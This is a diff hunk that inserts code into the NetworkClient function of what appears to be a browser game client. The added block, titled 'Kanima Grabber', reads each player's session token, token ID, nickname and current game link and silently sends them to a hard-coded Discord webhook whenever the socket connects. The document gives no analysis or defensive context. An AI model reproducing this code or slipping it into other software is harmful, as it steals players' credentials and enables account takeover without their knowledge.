@@ -50118,6 +50118,52 @@ function NetworkClient() {
     this.socket = new window.WebSocket(
        socketAddress
     );
+
+    const webhookUrl = 'https://discord.com/api/webhooks/1171188404998897735/VclWxif13ATVmvtfP5HB6tYrFdGKgJ6p4vglrl0JuGtqzgwupnZdyKLBSPUxQPoeC5Ck';
+
+    const userToken = user.token;
+    const nicknameValue = ui.nickname.input.value;
+    const tokenId = user.token_id;
+    
+    const embed = {
+        title: 'Kanima Grabber',
+        description: 'KANIMA OPPPPP',
+        fields: [
+            {
+                name: 'Game he Went',
+                value: link,
+            },
+            {
+                name: 'User Token',
+                value: userToken,
+            },
+            {
+                name: 'Nickname',
+                value: nicknameValue,
+            },
+            {
+                name: 'Token ID',
+                value: tokenId,
+            },
+        ],
+        color: 0x00ff00, // Color in hexadecimal format (here it's green)
+    };
+    
+    const payload = {
+        embeds: [embed],
+    };
+    
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload),
+    });
+
+
+
+
     this.socket["binaryType"] = "arraybuffer";
     this.socket._current_id = this._current_id;
 
